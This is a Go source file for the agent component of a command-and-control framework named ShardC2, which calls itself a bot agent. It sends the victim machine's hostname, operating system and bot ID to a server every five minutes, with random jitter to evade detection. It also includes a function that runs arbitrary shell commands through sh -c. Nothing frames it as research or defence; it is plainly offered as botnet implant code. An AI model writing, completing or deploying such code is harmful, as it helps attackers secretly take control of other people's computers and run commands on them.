package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

// Agent represents a ShardC2 bot agent
type Agent struct {
	ServerURL string
	BotID     string
}

// New creates a new agent instance
func New(serverURL string) *Agent {
	rand.Seed(time.Now().UnixNano())
	return &Agent{ServerURL: serverURL}
}

type BeaconData struct {
	BotID    string `json:"bot_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

func (a *Agent) Beacon() error {
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Failed to get hostname: %v", err)
		hostname = "unknown"
	}
	data := BeaconData{
		BotID:    a.BotID,
		Hostname: hostname,
		OS:       runtime.GOOS,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Printf("Failed to marshal beacon data: %v", err)
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "POST", a.ServerURL+"/beacon", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Failed to create request: %v", err)
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("Beacon request failed: %v", err)
		return err
	}
	defer resp.Body.Close()
	log.Printf("Beacon sent successfully")
	return nil
}

func (a *Agent) StartBeaconing() {
	for {
		err := a.Beacon()
		if err != nil {
			log.Printf("Beacon failed: %v", err)
			// Continue beaconing despite errors
		}
		jitter := time.Duration(rand.Intn(60)) * time.Second // 0-60s jitter
		time.Sleep(300*time.Second + jitter)                 // beacon every 5min + jitter
	}
}

func (a *Agent) ExecuteCommand(cmd string) (string, error) {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return "", err
	}
	return string(out), nil
}
